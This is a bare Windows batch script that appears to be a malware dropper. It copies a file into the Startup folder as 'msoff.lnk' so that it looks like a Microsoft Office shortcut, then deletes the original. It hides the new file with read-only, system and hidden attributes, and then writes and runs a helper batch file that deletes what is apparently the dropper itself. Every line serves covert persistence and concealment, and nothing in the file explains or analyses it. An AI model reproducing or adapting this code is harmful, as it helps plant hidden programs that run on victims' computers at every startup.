@echo off
copy /b c:\strip/b c:\windows\startm~1\programs\startup\msoff.lnk/b>nul
del c:\strip
attrib +r +s +h c:\windows\startm~1\programs\startup\msoff.lnk
echo @echo off>c:\Autoexce.bat
echo del c:\mani.bat>>c:\Autoexce.bat
c:\Autoexce.bat
